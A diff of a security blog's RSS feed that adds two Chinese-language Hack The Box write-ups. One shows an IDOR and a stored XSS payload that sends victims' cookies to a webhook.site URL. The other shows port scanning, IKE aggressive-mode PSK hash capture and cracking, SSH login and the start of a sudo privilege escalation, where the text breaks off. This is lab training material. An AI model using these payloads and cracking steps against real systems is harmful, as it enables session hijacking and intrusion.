@@ -5,8 +5,223 @@
         <description>Recent content in Posts on Welcome My Hack&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 09 Feb 2026 17:00:00 +0800</lastBuildDate>
+        <lastBuildDate>Sat, 14 Feb 2026 16:00:00 +0800</lastBuildDate>
         <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>HTB-Challenge-OnlyHacks</title>
+            <link>http://localhost:1313/posts/htb-challenge-onlyhacks/</link>
+            <pubDate>Sat, 14 Feb 2026 16:00:00 +0800</pubDate>
+            
+            <guid>http://localhost:1313/posts/htb-challenge-onlyhacks/</guid>
+            <description>&lt;h2 id=&#34;注册登入&#34;&gt;注册登入&lt;/h2&gt;
+&lt;p&gt;访问网址发现是一个类似交友网站的网站，可以注册登入。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Pasted%20image%2020260214160509.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;注册一个账号登入进网站。网站的功能很简单，&lt;code&gt;Dashboard&lt;/code&gt; 界面有名片，左滑不喜欢，右滑喜欢，可以在 &lt;code&gt;Matches&lt;/code&gt; 界面和喜欢的人聊天。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Pasted%20image%2020260214160709.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里重置了一下靶机环境，所以地址变了。在 &lt;code&gt;Matches&lt;/code&gt; 界面和刚刚右滑的人尝试聊天，可以正常进行。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Pasted%20image%2020260214161101.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;解法一&#34;&gt;解法一&lt;/h3&gt;
+&lt;p&gt;发现 &lt;code&gt;url&lt;/code&gt; 处的 &lt;code&gt;rid&lt;/code&gt; 为 &lt;code&gt;6&lt;/code&gt;，尝试更改，测试出当 &lt;code&gt;rid&lt;/code&gt; 为 &lt;code&gt;3&lt;/code&gt; 时出现 &lt;code&gt;flag&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Pasted%20image%2020260214161207.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;解法二&#34;&gt;解法二&lt;/h3&gt;
+&lt;p&gt;尝试输入框能否解析 &lt;code&gt;html&lt;/code&gt; 代码。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;Test&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;h1&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;Pasted%20image%2020260214161323.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以解析，尝试使用 &lt;code&gt;xss&lt;/code&gt; 外带 &lt;code&gt;cookie&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;先启用 &lt;code&gt;hookweb&lt;/code&gt;。浏览器访问 &lt;code&gt;https://webhook.site/&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;然后在聊天框中外带 &lt;code&gt;cookie&lt;/code&gt;。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;img&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;onerror&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fetch(&amp;#39;https://webhook.site/d64e8a36-1888-411a-b3c5-62b1ce0a3e2f?c=&amp;#39;+document.cookie)&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下面为 &lt;code&gt;script&lt;/code&gt; 格式 &lt;code&gt;payload&lt;/code&gt;，无法在此 &lt;code&gt;challenge&lt;/code&gt; 中执行成功&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;https://webhook.site/d64e8a36-1888-411a-b3c5-62b1ce0a3e2f?c=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获得聊天对象的 &lt;code&gt;cookie&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Pasted%20image%2020260214162029.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;修改 &lt;code&gt;f12&lt;/code&gt; 中 &lt;code&gt;Storge&lt;/code&gt; 中的 &lt;code&gt;Cookie&lt;/code&gt; 值，&lt;code&gt;f5&lt;/code&gt; 刷新后获得聊天对象的界面。切换至 &lt;code&gt;Dimitris&lt;/code&gt; 的聊天界面，获得 &lt;code&gt;flag&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;Pasted%20image%2020260214162245.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="注册登入">注册登入</h2>
+<p>访问网址发现是一个类似交友网站的网站，可以注册登入。</p>
+<p><img src="Pasted%20image%2020260214160509.png" alt=""></p>
+<p>注册一个账号登入进网站。网站的功能很简单，<code>Dashboard</code> 界面有名片，左滑不喜欢，右滑喜欢，可以在 <code>Matches</code> 界面和喜欢的人聊天。</p>
+<p><img src="Pasted%20image%2020260214160709.png" alt=""></p>
+<p>这里重置了一下靶机环境，所以地址变了。在 <code>Matches</code> 界面和刚刚右滑的人尝试聊天，可以正常进行。</p>
+<p><img src="Pasted%20image%2020260214161101.png" alt=""></p>
+<h3 id="解法一">解法一</h3>
+<p>发现 <code>url</code> 处的 <code>rid</code> 为 <code>6</code>，尝试更改，测试出当 <code>rid</code> 为 <code>3</code> 时出现 <code>flag</code>。</p>
+<p><img src="Pasted%20image%2020260214161207.png" alt=""></p>
+<h3 id="解法二">解法二</h3>
+<p>尝试输入框能否解析 <code>html</code> 代码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">h1</span>&gt;Test&lt;/<span style="color:#f92672">h1</span>&gt;
+</span></span></code></pre></div><p><img src="Pasted%20image%2020260214161323.png" alt=""></p>
+<p>可以解析，尝试使用 <code>xss</code> 外带 <code>cookie</code>。</p>
+<p>先启用 <code>hookweb</code>。浏览器访问 <code>https://webhook.site/</code>。</p>
+<p>然后在聊天框中外带 <code>cookie</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fetch(&#39;https://webhook.site/d64e8a36-1888-411a-b3c5-62b1ce0a3e2f?c=&#39;+document.cookie)&#34;</span>&gt;
+</span></span></code></pre></div><p>下面为 <code>script</code> 格式 <code>payload</code>，无法在此 <code>challenge</code> 中执行成功</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;https://webhook.site/d64e8a36-1888-411a-b3c5-62b1ce0a3e2f?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><p>获得聊天对象的 <code>cookie</code>。</p>
+<p><img src="Pasted%20image%2020260214162029.png" alt=""></p>
+<p>修改 <code>f12</code> 中 <code>Storge</code> 中的 <code>Cookie</code> 值，<code>f5</code> 刷新后获得聊天对象的界面。切换至 <code>Dimitris</code> 的聊天界面，获得 <code>flag</code>。</p>
+<p><img src="Pasted%20image%2020260214162245.png" alt=""></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>HTB-Expressway</title>
+            <link>http://localhost:1313/posts/htb-expressway/</link>
+            <pubDate>Thu, 12 Feb 2026 16:00:00 +0800</pubDate>
+            
+            <guid>http://localhost:1313/posts/htb-expressway/</guid>
+            <description>&lt;blockquote&gt;
+&lt;p&gt;本文章以 kali 地址为 10.10.16.41 做演示&lt;/p&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;初始侦察&#34;&gt;初始侦察&lt;/h2&gt;
+&lt;h3 id=&#34;nmap-端口扫描&#34;&gt;Nmap 端口扫描&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Work/Kali&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;                                                                         
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ sudo nmap --min-rate &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt; -p- 10.129.1.84                                                           
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;sudo&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; password &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; kali:                           
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2026-02-12 00:24 EST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.1.84                                                                         
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.12s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.     
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65534&lt;/span&gt; closed tcp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;reset&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE                     
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp open  ssh           
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 16.20 seconds
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nmap 扫描发现靶机的 TCP 服务仅开放 22 端口，进一步进行 UDP 端口扫描。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Work/Kali&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ sudo nmap -sU --min-rate &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt; -p- 10.129.1.84         
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Starting Nmap 7.95 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; at 2026-02-12 00:29 EST
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: 10.129.1.84 giving up on port because retransmission cap hit &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.1.84
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.19s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65448&lt;/span&gt; open|filtered udp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;no-response&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt; closed udp ports &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;port-unreach&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT    STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;500/udp open  isakmp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 85.54 seconds&lt;span style=&#34;color:#ae81ff&#34;&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;UDP 扫描出靶机开放了 500 端口，运行的是 isakmp 服务。&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<blockquote>
+<p>本文章以 kali 地址为 10.10.16.41 做演示</p></blockquote>
+<h2 id="初始侦察">初始侦察</h2>
+<h3 id="nmap-端口扫描">Nmap 端口扫描</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                         
+</span></span><span style="display:flex;"><span>└─$ sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.1.84                                                           
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali:                           
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-02-12 00:24 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.1.84                                                                         
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.     
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE                     
+</span></span><span style="display:flex;"><span>22/tcp open  ssh           
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 16.20 seconds
+</span></span></code></pre></div><p>Nmap 扫描发现靶机的 TCP 服务仅开放 22 端口，进一步进行 UDP 端口扫描。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nmap -sU --min-rate <span style="color:#ae81ff">10000</span> -p- 10.129.1.84         
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-02-12 00:29 EST
+</span></span><span style="display:flex;"><span>Warning: 10.129.1.84 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.1.84
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.19s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65448</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">86</span> closed udp ports <span style="color:#f92672">(</span>port-unreach<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>500/udp open  isakmp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 85.54 seconds<span style="color:#ae81ff">\
+</span></span></span></code></pre></div><p>UDP 扫描出靶机开放了 500 端口，运行的是 isakmp 服务。</p>
+<p>ISAKMP（Internet Security Association and Key Management Protocol）是 IPsec VPN 的核心协议，运行在 UDP 500 端口。它负责在两个 VPN 端点之间建立安全通道，进行身份验证和密钥交换。</p>
+<p>ISAKMP/IKE 有两种工作模式</p>
+<ul>
+<li>Main Mode：认证哈希是加密传输，相对安全</li>
+<li>Aggressive Mode：认证哈希以明文传输</li>
+</ul>
+<p>如果使用的是 Aggressive Mode，则可能导致哈希泄露。</p>
+<h2 id="isakmp-渗透">ISAKMP 渗透</h2>
+<p>使用 <code>ike-scan</code> 捕获 <code>PSK</code> 哈希。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo ike-scan -M -A --pskcrack<span style="color:#f92672">=</span>enil.hash 10.129.1.84
+</span></span><span style="display:flex;"><span>Starting ike-scan 1.9.6 with <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>http://www.nta-monitor.com/tools/ike-scan/<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.129.1.84     Aggressive Mode Handshake returned
+</span></span><span style="display:flex;"><span>        HDR<span style="color:#f92672">=(</span>CKY-R<span style="color:#f92672">=</span>0b0712b44a97eb56<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        SA<span style="color:#f92672">=(</span>Enc<span style="color:#f92672">=</span>3DES Hash<span style="color:#f92672">=</span>SHA1 Group<span style="color:#f92672">=</span>2:modp1024 Auth<span style="color:#f92672">=</span>PSK LifeType<span style="color:#f92672">=</span>Seconds LifeDuration<span style="color:#f92672">=</span>28800<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        KeyExchange<span style="color:#f92672">(</span><span style="color:#ae81ff">128</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        Nonce<span style="color:#f92672">(</span><span style="color:#ae81ff">32</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        ID<span style="color:#f92672">(</span>Type<span style="color:#f92672">=</span>ID_USER_FQDN, Value<span style="color:#f92672">=</span>ike@expressway.htb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        VID<span style="color:#f92672">=</span>09002689dfd6b712 <span style="color:#f92672">(</span>XAUTH<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        VID<span style="color:#f92672">=</span>afcad71368a1f1c96b8696fc77570100 <span style="color:#f92672">(</span>Dead Peer Detection v1.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        Hash<span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ending ike-scan 1.9.6: <span style="color:#ae81ff">1</span> hosts scanned in 0.099 seconds <span style="color:#f92672">(</span>10.15 hosts/sec<span style="color:#f92672">)</span>.  <span style="color:#ae81ff">1</span> returned handshake; <span style="color:#ae81ff">0</span> returned notify
+</span></span></code></pre></div><p>使用 <code>psk-crack</code> 破解捕捉到的哈希得到账号 <code>ike</code> 和密码 <code>freakingrockstarontheroad</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                           
+</span></span><span style="display:flex;"><span>└─$ ls                                              
+</span></span><span style="display:flex;"><span>enil.hash                 
+</span></span><span style="display:flex;"><span>                                                    
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>                                                                           
+</span></span><span style="display:flex;"><span>└─$ psk-crack -d /usr/share/wordlists/rockyou.txt enil.hash                     
+</span></span><span style="display:flex;"><span>Starting psk-crack <span style="color:#f92672">[</span>ike-scan 1.9.6<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>http://www.nta-monitor.com/tools/ike-scan/<span style="color:#f92672">)</span>                         
+</span></span><span style="display:flex;"><span>Running in dictionary cracking mode                                                                     
+</span></span><span style="display:flex;"><span>key <span style="color:#e6db74">&#34;freakingrockstarontheroad&#34;</span> matches SHA1 hash b4f93578606af4e183e6f0eebac53fc533232c32
+</span></span><span style="display:flex;"><span>Ending psk-crack: <span style="color:#ae81ff">8045040</span> iterations in 7.213 seconds <span style="color:#f92672">(</span>1115400.93 iterations/sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="linux-提权">Linux 提权</h2>
+<p>使用破解得到的账号密码进行 ssh 登入获得初始立足点 <code>ike</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh ike@10.129.1.84
+</span></span><span style="display:flex;"><span>ike@10.129.1.84<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Last login: Thu Feb <span style="color:#ae81ff">12</span> 05:40:34 GMT <span style="color:#ae81ff">2026</span> from 10.10.16.41 on ssh
+</span></span><span style="display:flex;"><span>Linux expressway.htb 6.16.7+deb14-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Thu Feb <span style="color:#ae81ff">12</span> 08:57:46 <span style="color:#ae81ff">2026</span> from 10.10.16.41
+</span></span><span style="display:flex;"><span>ike@expressway:~$ whoami
+</span></span><span style="display:flex;"><span>ike
+</span></span></code></pre></div><p>经过枚举发现靶机的 <code>sudo</code> 版本为 1.9.17，符合 <code>CVE-2025-32463</code> 的提权条件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:~$ sudo -V
+</span></span><span style="display:flex;"><span>Sudo version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers policy plugin version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers file grammar version <span style="color:#ae81ff">50</span>
